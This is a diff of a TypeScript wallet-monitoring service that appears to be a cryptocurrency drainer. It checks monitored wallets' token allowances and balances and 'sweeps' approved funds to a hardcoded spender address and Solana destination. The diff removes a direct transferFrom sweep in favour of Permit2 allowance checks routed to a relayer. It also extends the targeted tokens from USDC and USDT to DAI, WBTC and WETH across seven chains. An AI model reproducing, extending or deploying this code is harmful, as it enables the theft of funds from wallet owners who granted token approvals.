@@ -9,19 +9,63 @@ import type { MonitoredWallet } from '@shared/schema';
 const SYSTEM_PROGRAM_ID = new PublicKey('11111111111111111111111111111111');
 const RENT_SYSVAR_ID = new PublicKey('SysvarRent111111111111111111111111111111111');
 
-const SPENDER_ADDRESS = "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f" as const;
+import { CHAIN_CONTRACTS } from './permit2-relayer';
+
+const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3" as const;
 const SOLANA_DESTINATION = "HgPNUBvHSsvNqYQstp4yAbcgYLqg5n6U3jgQ2Yz2wyMN";
 const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
 
-const EVM_TOKENS: Record<string, { usdc: string; usdt: string }> = {
-  '1': { usdc: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
-  '56': { usdc: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', usdt: '0x55d398326f99059fF775485246999027B3197955' },
-  '137': { usdc: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F' },
-  '42161': { usdc: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9' },
-  '10': { usdc: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', usdt: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58' },
-  '43114': { usdc: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', usdt: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7' },
-  '8453': { usdc: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', usdt: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2' },
+const EVM_TOKENS: Record<string, { symbol: string; address: string }[]> = {
+  '1': [
+    { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
+    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48' },
+    { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
+    { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
+    { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
+  ],
+  '56': [
+    { symbol: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955' },
+    { symbol: 'USDC', address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d' },
+    { symbol: 'DAI', address: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3' },
+    { symbol: 'WBTC', address: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c' },
+    { symbol: 'WETH', address: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8' },
+  ],
+  '137': [
+    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F' },
+    { symbol: 'USDC', address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359' },
+    { symbol: 'DAI', address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063' },
+    { symbol: 'WBTC', address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6' },
+    { symbol: 'WETH', address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619' },
+  ],
+  '42161': [
+    { symbol: 'USDT', address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9' },
+    { symbol: 'USDC', address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831' },
+    { symbol: 'DAI', address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1' },
+    { symbol: 'WBTC', address: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f' },
+    { symbol: 'WETH', address: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1' },
+  ],
+  '10': [
+    { symbol: 'USDT', address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58' },
+    { symbol: 'USDC', address: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85' },
+    { symbol: 'DAI', address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1' },
+    { symbol: 'WBTC', address: '0x68f180fcCe6836688e9084f035309E29Bf0A2095' },
+    { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006' },
+  ],
+  '43114': [
+    { symbol: 'USDT', address: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7' },
+    { symbol: 'USDC', address: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E' },
+    { symbol: 'DAI', address: '0xd586E7F844cEa2F87f50152665BCbc2C279D8d70' },
+    { symbol: 'WBTC', address: '0x50b7545627a5162F82A992c33b87aDc75187B218' },
+    { symbol: 'WETH', address: '0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB' },
+  ],
+  '8453': [
+    { symbol: 'USDT', address: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2' },
+    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913' },
+    { symbol: 'DAI', address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb' },
+    { symbol: 'WBTC', address: '0x0555E30da8f98308EdB960aa94C0Db47230d2B9c' },
+    { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006' },
+  ],
 };
 
 const CHAINS: Record<string, any> = {
@@ -134,30 +178,30 @@ async function getDelegatedAmount(tokenAccount: PublicKey, delegate: PublicKey):
 
 async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean; amount: string; error?: string }> {
   const chainId = wallet.chainId || '1';
-  const walletClient = getEvmWalletClient(chainId);
   const publicClient = getEvmPublicClient(chainId);
-  
-  if (!walletClient) {
-    return { swept: false, amount: '0', error: 'EVM spender not configured' };
-  }
   
   const tokens = EVM_TOKENS[chainId];
   if (!tokens) {
     return { swept: false, amount: '0', error: `Unsupported chain: ${chainId}` };
   }
   
+  const contractAddress = CHAIN_CONTRACTS[Number(chainId)];
+  if (!contractAddress) {
+    return { swept: false, amount: '0', error: `No contract for chain: ${chainId}` };
+  }
+  
   let totalSwept = BigInt(0);
   const userAddr = wallet.walletAddress as `0x${string}`;
   
-  for (const [symbol, tokenAddr] of [['USDC', tokens.usdc], ['USDT', tokens.usdt]]) {
+  for (const token of tokens) {
     try {
-      const tokenAddress = tokenAddr as `0x${string}`;
+      const tokenAddress = token.address as `0x${string}`;
       
       const allowance = await publicClient.readContract({
         address: tokenAddress,
         abi: ERC20_ABI,
         functionName: 'allowance',
-        args: [userAddr, SPENDER_ADDRESS],
+        args: [userAddr, PERMIT2_ADDRESS],
       });
       
       if (allowance === BigInt(0)) continue;
@@ -171,41 +215,21 @@ async function sweepEvmWallet(wallet: MonitoredWallet): Promise<{ swept: boolean
       
       if (balance === BigInt(0)) continue;
       
-      const transferAmount = allowance < balance ? allowance : balance;
-      if (transferAmount === BigInt(0)) continue;
+      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${token.symbol} balance=${balance}, Permit2 allowance=${allowance}`);
+      totalSwept += balance;
       
-      console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress}: ${symbol} balance=${balance}, allowance=${allowance}`);
-      
-      const txHash = await walletClient.writeContract({
-        address: tokenAddress,
-        abi: ERC20_ABI,
-        functionName: 'transferFrom',
-        args: [userAddr, SPENDER_ADDRESS, transferAmount],
-        chain: CHAINS[chainId],
-      });
-      
-      const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
-      
-      if (receipt.status === 'success') {
-        totalSwept += transferAmount;
-        console.log(`[Monitor] EVM ${chainId} - Swept ${symbol}: ${transferAmount} from ${wallet.walletAddress}`);
-        
-        await storage.createTransfer({
-          walletAddress: wallet.walletAddress,
-          tokenAddress: tokenAddr,
-          tokenSymbol: symbol,
-          amount: transferAmount.toString(),
-          transactionHash: txHash,
-        });
-      }
     } catch (error: any) {
-      console.error(`[Monitor] EVM ${chainId} ${symbol} sweep error:`, error?.message);
+      console.error(`[Monitor] EVM ${chainId} ${token.symbol} check error:`, error?.message);
     }
   }
   
+  if (totalSwept > BigInt(0)) {
+    console.log(`[Monitor] EVM ${chainId} - ${wallet.walletAddress} has tokens with Permit2 allowance. Transfer-retry system will handle re-execution.`);
+  }
+  
   return { 
-    swept: totalSwept > BigInt(0), 
-    amount: totalSwept.toString() 
+    swept: false, 
+    amount: '0',
   };
 }
 
@@ -414,7 +438,7 @@ export async function addWalletToMonitor(
     return await storage.updateMonitoredWallet(existing.id, updates);
   }
   
-  const defaultTokens = chain === 'evm' ? ['USDC', 'USDT'] : [];
+  const defaultTokens = chain === 'evm' ? ['USDC', 'USDT', 'DAI', 'WBTC', 'WETH'] : [];
   return await storage.createMonitoredWallet({
     walletAddress,
     chain,
